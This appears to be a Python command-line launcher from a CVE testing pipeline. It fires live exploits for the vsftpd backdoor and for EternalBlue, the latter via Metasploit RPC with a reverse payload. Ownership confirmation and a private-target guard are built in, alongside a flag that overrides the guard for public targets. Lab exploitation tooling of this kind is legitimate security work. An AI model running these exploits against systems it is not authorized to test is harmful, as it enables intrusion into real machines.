"""Run the real execution stage against a lab target you control and own.

    uv run cve-pipeline-live CVE-2011-2523 --target 192.168.56.101 --i-own-this-target
    uv run cve-pipeline-live CVE-2017-0144 --target 192.168.56.102 --lhost 192.168.56.1 --i-own-this-target

This is separate from `cve-pipeline` (the CVE-fetch/LLM-generate/baseline-mock
pipeline) on purpose: it performs a real network exploitation attempt and must
never fire from an automated or web-facing default path without an explicit,
per-run target and authorization confirmation.
"""

from __future__ import annotations

import argparse
import json
import sys

from cve_pipeline.config import get_settings
from cve_pipeline.exploit_runner import available_cve_ids, run_eternalblue_via_msf_rpc, run_vsftpd_backdoor
from cve_pipeline.net_guard import UnauthorizedTargetError
from cve_pipeline.pipeline import OUTPUT_DIR


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("cve_id", choices=available_cve_ids(), help="which CVE's live runner to execute")
    parser.add_argument("--target", required=True, help="lab target IP/hostname you own or are authorized to test")
    parser.add_argument("--lhost", help="your listener IP (required for CVE-2017-0144's reverse payload)")
    parser.add_argument(
        "--i-own-this-target",
        action="store_true",
        dest="confirmed",
        help="required: confirms you own or have explicit written authorization to test --target",
    )
    parser.add_argument(
        "--allow-public-target",
        action="store_true",
        help="override the private/loopback-only guard (use only with real authorization)",
    )
    return parser.parse_args()


def main() -> None:
    args = _parse_args()
    settings = get_settings()

    try:
        if args.cve_id == "CVE-2011-2523":
            result = run_vsftpd_backdoor(
                args.target, confirmed=args.confirmed, allow_public_target=args.allow_public_target
            )
        else:
            if not args.lhost:
                print("--lhost is required for CVE-2017-0144", file=sys.stderr)
                raise SystemExit(1)
            result = run_eternalblue_via_msf_rpc(
                args.target,
                args.lhost,
                confirmed=args.confirmed,
                rpc_host=settings.msf_rpc_host,
                rpc_port=settings.msf_rpc_port,
                rpc_password=settings.msf_rpc_password,
                ssl=settings.msf_rpc_ssl,
                allow_public_target=args.allow_public_target,
            )
    except UnauthorizedTargetError as exc:
        print(f"Refused: {exc}", file=sys.stderr)
        raise SystemExit(1)

    for line in result.transcript:
        print(f"  {line}")
    print(f"\n{'SUCCESS' if result.success else 'FAILED'}: {result.cve_id} against {result.target}")

    out_dir = OUTPUT_DIR / result.cve_id
    out_dir.mkdir(parents=True, exist_ok=True)
    (out_dir / "live_execution_report.json").write_text(json.dumps(result.as_dict(), indent=2), encoding="utf-8")
    print(f"Report saved to {out_dir / 'live_execution_report.json'}")

    if not result.success:
        raise SystemExit(1)


if __name__ == "__main__":
    main()
